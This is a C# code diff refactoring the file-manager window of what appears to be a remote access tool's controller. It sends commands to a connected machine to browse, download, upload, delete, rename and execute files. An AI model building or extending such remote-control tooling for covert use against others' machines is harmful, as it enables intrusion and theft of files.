@@ -1,24 +1,25 @@
 ﻿using Server.MessagePack;
-using Server.Sockets;
+using Server.Connection;
 using System;
 using System.Windows.Forms;
 using System.Threading;
 using System.IO;
 using Microsoft.VisualBasic;
 using System.Text;
+using System.Drawing;
+using System.Diagnostics;
 
 namespace Server.Forms
 {
     public partial class FormFileManager : Form
     {
+        public Form1 F { get; set; }
+        internal Clients Client { get; set; }
+        public string FullPath { get; set; }
         public FormFileManager()
         {
             InitializeComponent();
         }
-
-        public Form1 F { get; set; }
-        internal Clients C { get; set; }
-
         private void listView1_DoubleClick(object sender, EventArgs e)
         {
             try
@@ -29,8 +30,10 @@ namespace Server.Forms
                     msgpack.ForcePathObject("Packet").AsString = "fileManager";
                     msgpack.ForcePathObject("Command").AsString = "getPath";
                     msgpack.ForcePathObject("Path").AsString = listView1.SelectedItems[0].ToolTipText;
-                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
-                    //toolStripStatusLabel1.Text = listView1.SelectedItems[0].ToolTipText;
+                    listView1.Enabled = false;
+                    toolStripStatusLabel3.ForeColor = Color.Green;
+                    toolStripStatusLabel3.Text = "Please Wait";
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
             }
             catch
@@ -50,15 +53,14 @@ namespace Server.Forms
                     msgpack.ForcePathObject("Packet").AsString = "fileManager";
                     msgpack.ForcePathObject("Command").AsString = "getDrivers";
                     toolStripStatusLabel1.Text = "";
-                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                     return;
                 }
                 path = path.Remove(path.LastIndexOfAny(new char[] { '\\' }, path.LastIndexOf('\\')));
                 msgpack.ForcePathObject("Packet").AsString = "fileManager";
                 msgpack.ForcePathObject("Command").AsString = "getPath";
                 msgpack.ForcePathObject("Path").AsString = path + "\\";
-                //toolStripStatusLabel1.Text = path;
-                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
             catch
             {
@@ -66,7 +68,7 @@ namespace Server.Forms
                 msgpack.ForcePathObject("Packet").AsString = "fileManager";
                 msgpack.ForcePathObject("Command").AsString = "getDrivers";
                 toolStripStatusLabel1.Text = "";
-                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 return;
             }
 
@@ -78,8 +80,8 @@ namespace Server.Forms
             {
                 if (listView1.SelectedItems.Count > 0)
                 {
-                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + C.ID)))
-                        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + C.ID));
+                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + Client.ID)))
+                        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + Client.ID));
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         if (itm.ImageIndex == 0 && itm.ImageIndex == 1 && itm.ImageIndex == 2) return;
@@ -89,7 +91,7 @@ namespace Server.Forms
                         msgpack.ForcePathObject("Command").AsString = "socketDownload";
                         msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
                         msgpack.ForcePathObject("DWID").AsString = dwid;
-                        ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                         this.BeginInvoke((MethodInvoker)(() =>
                         {
                             FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
@@ -98,7 +100,7 @@ namespace Server.Forms
                                 SD = new FormDownloadFile
                                 {
                                     Name = "socketDownload:" + dwid,
-                                    Text = "socketDownload:" + C.ID,
+                                    Text = "socketDownload:" + Client.ID,
                                     F = F
                                 };
                                 SD.Show();
@@ -113,40 +115,40 @@ namespace Server.Forms
         private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (toolStripStatusLabel1.Text.Length >= 3)
-            try
-            {
-                OpenFileDialog O = new OpenFileDialog();
-                O.Multiselect = true;
-                if (O.ShowDialog() == DialogResult.OK)
+                try
                 {
-                    foreach (string ofile in O.FileNames)
+                    OpenFileDialog O = new OpenFileDialog();
+                    O.Multiselect = true;
+                    if (O.ShowDialog() == DialogResult.OK)
                     {
-                        FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + ""];
-                        if (SD == null)
+                        foreach (string ofile in O.FileNames)
                         {
-                            SD = new FormDownloadFile
+                            FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + ""];
+                            if (SD == null)
                             {
-                                Name = "socketUpload:" + Guid.NewGuid().ToString(),
-                                Text = "socketUpload:" + C.ID,
-                                F = Program.form1,
-                                C = C
-                            };
-                            SD.dSize = new FileInfo(ofile).Length;
-                            SD.labelfile.Text = Path.GetFileName(ofile);
-                            SD.fullFileName = ofile;
-                            SD.label1.Text = "Upload:";
-                            SD.clientFullFileName = toolStripStatusLabel1.Text + "\\" + Path.GetFileName(ofile);
-                            MsgPack msgpack = new MsgPack();
-                            msgpack.ForcePathObject("Packet").AsString = "fileManager";
-                            msgpack.ForcePathObject("Command").AsString = "reqUploadFile";
-                            msgpack.ForcePathObject("ID").AsString = SD.Name;
-                            SD.Show();
-                            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                                SD = new FormDownloadFile
+                                {
+                                    Name = "socketUpload:" + Guid.NewGuid().ToString(),
+                                    Text = "socketUpload:" + Client.ID,
+                                    F = Program.form1,
+                                    Client = Client
+                                };
+                                SD.FileSize = new FileInfo(ofile).Length;
+                                SD.labelfile.Text = Path.GetFileName(ofile);
+                                SD.FullFileName = ofile;
+                                SD.label1.Text = "Upload:";
+                                SD.ClientFullFileName = toolStripStatusLabel1.Text + "\\" + Path.GetFileName(ofile);
+                                MsgPack msgpack = new MsgPack();
+                                msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                                msgpack.ForcePathObject("Command").AsString = "reqUploadFile";
+                                msgpack.ForcePathObject("ID").AsString = SD.Name;
+                                SD.Show();
+                                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+                            }
                         }
                     }
                 }
-            }
-            catch { }
+                catch { }
         }
 
         private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
@@ -163,7 +165,7 @@ namespace Server.Forms
                             msgpack.ForcePathObject("Packet").AsString = "fileManager";
                             msgpack.ForcePathObject("Command").AsString = "deleteFile";
                             msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
-                            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                         }
                         else if (itm.ImageIndex == 0)
                         {
@@ -171,7 +173,7 @@ namespace Server.Forms
                             msgpack.ForcePathObject("Packet").AsString = "fileManager";
                             msgpack.ForcePathObject("Command").AsString = "deleteFolder";
                             msgpack.ForcePathObject("Folder").AsString = itm.ToolTipText;
-                            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                         }
                     }
                 }
@@ -189,14 +191,14 @@ namespace Server.Forms
                     msgpack.ForcePathObject("Packet").AsString = "fileManager";
                     msgpack.ForcePathObject("Command").AsString = "getPath";
                     msgpack.ForcePathObject("Path").AsString = toolStripStatusLabel1.Text;
-                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
                 else
                 {
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "fileManager";
                     msgpack.ForcePathObject("Command").AsString = "getDrivers";
-                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                     return;
                 }
             }
@@ -215,7 +217,7 @@ namespace Server.Forms
                         msgpack.ForcePathObject("Packet").AsString = "fileManager";
                         msgpack.ForcePathObject("Command").AsString = "execute";
                         msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
-                        ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                     }
                 }
             }
@@ -227,7 +229,11 @@ namespace Server.Forms
 
         private void Timer1_Tick(object sender, EventArgs e)
         {
-            if (!C.ClientSocket.Connected) this.Close();
+            try
+            {
+                if (!Client.TcpClient.Connected) this.Close();
+            }
+            catch { this.Close(); }
         }
 
         private void DESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
@@ -238,8 +244,7 @@ namespace Server.Forms
                 msgpack.ForcePathObject("Packet").AsString = "fileManager";
                 msgpack.ForcePathObject("Command").AsString = "getPath";
                 msgpack.ForcePathObject("Path").AsString = "DESKTOP";
-                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
-                //toolStripStatusLabel1.Text = "DESKTOP";
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
             catch
             {
@@ -255,8 +260,7 @@ namespace Server.Forms
                 msgpack.ForcePathObject("Packet").AsString = "fileManager";
                 msgpack.ForcePathObject("Command").AsString = "getPath";
                 msgpack.ForcePathObject("Path").AsString = "APPDATA";
-                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
-                //toolStripStatusLabel1.Text = "APPDATA";
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
             catch
             {
@@ -277,7 +281,7 @@ namespace Server.Forms
                     msgpack.ForcePathObject("Packet").AsString = "fileManager";
                     msgpack.ForcePathObject("Command").AsString = "createFolder";
                     msgpack.ForcePathObject("Folder").AsString = Path.Combine(toolStripStatusLabel1.Text, foldername);
-                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
             }
             catch { }
@@ -298,7 +302,7 @@ namespace Server.Forms
                     msgpack.ForcePathObject("Packet").AsString = "fileManager";
                     msgpack.ForcePathObject("Command").AsString = "copyFile";
                     msgpack.ForcePathObject("File").AsString = files.ToString();
-                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
             }
             catch { }
@@ -312,7 +316,7 @@ namespace Server.Forms
                 msgpack.ForcePathObject("Packet").AsString = "fileManager";
                 msgpack.ForcePathObject("Command").AsString = "pasteFile";
                 msgpack.ForcePathObject("File").AsString = toolStripStatusLabel1.Text;
-                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
             catch { }
         }
@@ -335,7 +339,7 @@ namespace Server.Forms
                             msgpack.ForcePathObject("Command").AsString = "renameFile";
                             msgpack.ForcePathObject("File").AsString = listView1.SelectedItems[0].ToolTipText;
                             msgpack.ForcePathObject("NewName").AsString = Path.Combine(toolStripStatusLabel1.Text, filename);
-                            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                             return;
                         }
                         else if (listView1.SelectedItems[0].ImageIndex == 0)
@@ -345,12 +349,48 @@ namespace Server.Forms
                             msgpack.ForcePathObject("Command").AsString = "renameFolder";
                             msgpack.ForcePathObject("Folder").AsString = listView1.SelectedItems[0].ToolTipText + "\\";
                             msgpack.ForcePathObject("NewName").AsString = Path.Combine(toolStripStatusLabel1.Text, filename);
-                            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                         }
                     }
                 }
                 catch { }
             }
+        }
+
+        private void UserProfileToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                msgpack.ForcePathObject("Command").AsString = "getPath";
+                msgpack.ForcePathObject("Path").AsString = "USER";
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+            }
+            catch
+            {
+
+            }
+        }
+
+        private void DriversListsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "fileManager";
+            msgpack.ForcePathObject("Command").AsString = "getDrivers";
+            toolStripStatusLabel1.Text = "";
+            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+        }
+
+        private void OpenClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (!Directory.Exists(FullPath))
+                    Directory.CreateDirectory(FullPath);
+                Process.Start(FullPath);
+            }
+            catch { }
         }
     }
 }
